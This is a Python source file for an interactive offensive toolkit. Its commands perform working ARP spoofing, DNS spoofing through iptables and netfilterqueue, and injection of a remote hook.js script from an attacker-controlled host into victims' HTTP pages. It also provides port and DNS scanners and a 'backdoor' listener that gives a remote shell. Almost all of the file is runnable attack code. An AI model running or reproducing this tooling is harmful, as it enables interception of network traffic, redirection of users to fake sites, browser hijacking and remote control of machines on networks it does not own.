#!/usr/bin/env python

import scapy.all as scapy
import re
import time
import sys
import multiprocessing
import netfilterqueue
import subprocess
import socket

import NetworkScanner
import VulnerabilityScanner
from Listener import Listener


def help_message():
    print("--------------------------------------------------")
    print("COMMANDS      DESCRIPTION")
    print("--------------------------------------------------")
    print("help          Show commands")
    print("scan          Network scanning")
    print("arpspoof      Manual or Auto Arp Spoof")
    print("dnsspoof      DNS Spoof Attack")
    print("hook          Hook Injector")
    print("killarp       Kill process running Arp Spoof")
    print("killdns       Kill process running Dns Spoof")
    print("killhook      Kill process running Hook Injector")
    print("vulnscan      Vulnerability Scanner")
    print("backdoor      Control Center")
    print("portscan      Scan for open ports")
    print("requestdns    Scan for open ports on a DNS server")
    print("exit          Exit the app")
    print("--------------------------------------------------")


def ip_input(scan_list):
    trgt, src = '', ''
    print("IP Table")
    print("--------")
    for ip in scan_list:
        print(ip)
    print("--------")
    while trgt not in scan_list or src not in scan_list:
        trgt = input('\nYour target IP: ')
        src = input('Your source IP: ')
    return [trgt], src


def get_mac(ip):
    answered_mac = NetworkScanner.broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        pass


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)
    print("[+] Done!")
    global allow_arp
    allow_arp = 1


def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                time.sleep(2)
        except:
            print("[!] Something went wrong ... Resetting ARP Tables...")
            cleanup(targets, src)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")


def process_packet_dns(packet, target_website, modified_ip):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            try:
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
            except IndexError:
                pass

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def process_packet_hook(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
        load = load.replace("HTTP/1.1", "HTTP/1.0")
        if scapy_packet[scapy.TCP].dport == 80:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
            load = load.replace("</body>", "</body>" + injection_code)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load.decode("utf-8", "ignore"):
            scapy_packet[scapy.Raw].load = load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def dns_spoof(target_website, modified_ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,
               lambda packet, target_website=target_website, modified_ip=modified_ip:
               process_packet_dns(packet, target_website, modified_ip)
               )
    try:
        queue.run()
    except:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
        global allow_dns
        allow_dns = 1


def hook():
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet_hook)
    try:
        queue.run()
    except:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
        global allow_hook
        allow_hook = 1


def kill_dns():
    try:
        if dns_process.is_alive():
            dns_process.terminate()
            print("[!] Dns process terminated ... FlUSHING IPTABLES...")
            subprocess.run(["iptables", "--flush"])
            print("[+] Done.")
            global allow_dns
            allow_dns = 1
        else:
            print('[-] No dns spoof running at the moment.')
    except NameError:
        print('[-] No dns spoof running at the moment.')


def kill_hook():
    try:
        if hook_process.is_alive():
            hook_process.terminate()
            print("[!] Hook process terminated ... FlUSHING IPTABLES...")
            subprocess.run(["iptables", "--flush"])
            print("[+] Done.")
            global allow_hook
            allow_hook = 1
        else:
            print('[-] No Hook Injector running at the moment.')
    except NameError:
        print('[-] No Hook Injector running at the moment.')


def kill_arp():
    try:
        if arp_process.is_alive():
            kill_dns()
            kill_hook()
            arp_process.terminate()
            print("[!] Arp process terminated ... Resetting ARP Tables...")
            cleanup(selected, source)
            if SYS_PLATFORM == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write("0")
        else:
            print('[-] No arp spoof running at the moment.')
    except NameError:
        print('[-] No arp spoof running at the moment.')


def scan_ports():
    port_list_tcp = []
    ip = input("Insert IP: ")
    print("[+] Scanning...")
    for port in range(1, 65536):
        try:
            socket.setdefaulttimeout(2)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            port_list_tcp.append(port)
            banner = s.recv(1024).decode('utf-8').strip("\r\n")
            s.close()
            if banner:
                print("Port: {} : {}".format(port, banner))
        except:
            pass
    return port_list_tcp


def scan_dns(dns_port):
    udp = scapy.UDP(sport=my_port, dport=dns_port)
    query = ip / udp / dns

    rawsock.sendto(scapy.raw(query), (dns_ip, dns_port))
    sock.settimeout(0.0001)
    try:
        (res, addr) = sock.recvfrom(2048)
        return addr[1]
    except socket.timeout:
        pass


SYS_PLATFORM = sys.platform
command = ''
allow_arp = 1
allow_dns = 1
allow_hook = 1
scan_result = []
tcp_ports = []
router_ip = scapy.conf.route.route("0.0.0.0")[2]


print("  __  __       ______               _     _____       \n"
      " |  \/  |     |___  /              | |   |  __ \      \n"
      " | \  / |_   _   / / ___  _ __ ___ | |__ | |__) |   _ \n"
      " | |\/| | | | | / / / _ \| '_ ` _ \| '_ \|  ___/ | | |\n"
      " | |  | | |_| |/ /_| (_) | | | | | | |_) | |   | |_| |\n"
      " |_|  |_|\__, /_____\___/|_| |_| |_|_.__/|_|    \__, |\n"
      "          __/ |                                  __/ |\n"
      "         |___/                                  |___/ \n")
print("Type help to show commands\n")
print("Welcome back Boss!")

while True:
    print("Insert your command:")
    command = input(">> ")
    if command == "exit":
        kill_arp()
        print("[+] Cya later Boss!")
        sys.exit()

    elif command == "scan":
        scan_result = NetworkScanner.network_scanner()

    elif command == "arpspoof":
        if allow_arp and scan_result:
            option = ''
            print('Default mode: auto. Type "man" for manual')
            option = input(">> Option: ")

            if option == 'man':
                selected = []
                selected, source = ip_input(scan_result)
            else:
                source = router_ip
                selected = scan_result

            arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
            print("[+] Initializing Arp Spoof...")
            arp_process.start()
            allow_arp = 0
        else:
            print('[!] Network IPs not defined or Arp spoof already running.')

    elif command == 'dnsspoof':
        if allow_dns:
            try:
                if arp_process.is_alive():
                    kill_hook()
                    target_website = input('Your target website: ')
                    modified_ip = input('Your redirect IP: ')
                    dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
                    print("[+] Initializing Dns Spoof...")
                    dns_process.start()
                    allow_dns = 0
                else:
                    print('[-] No arp spoof running at the moment.')
            except NameError:
                print('[-] No arp spoof running at the moment.')
        else:
            print('[!] Dns spoof already running.')

    elif command == 'hook':
        if allow_hook:
            try:
                if arp_process.is_alive():
                    kill_dns()
                    hook_process = multiprocessing.Process(target=hook)
                    print("[+] Initializing Hook Injector...")
                    hook_process.start()
                    allow_hook = 0
                else:
                    print('[-] No arp spoof running at the moment.')
            except NameError:
                print('[-] No arp spoof running at the moment.')
        else:
            print('[!] Hook injector already running.')

    elif command == 'vulnscan':
        vuln_scanner = VulnerabilityScanner.vulnscan_info()
        print("\n[+] Initializing Vulnerability Scanner...")
        try:
            vuln_scanner.crawl()
            vuln_scanner.run_scanner()
        except:
            print("[!] Something went wrong.")
        print("\n[+] Process finished...")

    elif command == 'backdoor':
        my_listener = Listener("10.0.2.10", 6217)
        service = multiprocessing.Process(target=my_listener.server)
        connections_status = multiprocessing.Process(target=my_listener.check_connections)
        service.start()
        connections_status.start()
        my_listener.shell()
        connections_status.terminate()
        service.terminate()

    elif command == 'portscan':
        tcp_ports = scan_ports()
        print("Open Ports: {}".format(str(tcp_ports).replace(' ', '')))

    elif command == 'requestdns':
        my_ip = '10.0.2.10'
        my_domain = input("Insert domain name: ")
        my_port = 5533
        dns_ip = input("Insert IP: ")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((my_ip, my_port))

        rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)

        ip = scapy.IP(src=my_ip, dst=dns_ip)
        qdsec = scapy.DNSQR(qname=my_domain, qtype="A", qclass="IN")
        dns = scapy.DNS(qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qdsec)

        p = multiprocessing.Pool(8)
        print("Sending requests...")
        open_dns_ports = p.map(scan_dns, list(range(1, 65535 + 1)))
        p.close()
        p.join()
        open_dns_ports = [port for port in open_dns_ports if port is not None]
        print("Open Ports: {}".format(str(open_dns_ports).replace(' ', '')))
        sock.close()
        rawsock.close()

    elif command == 'killarp':
        kill_arp()

    elif command == 'killdns':
        kill_dns()

    elif command == 'killhook':
        kill_hook()

    elif command == "help":
        help_message()

    else:
        print('[-] Command not found. Type help to show commands.')
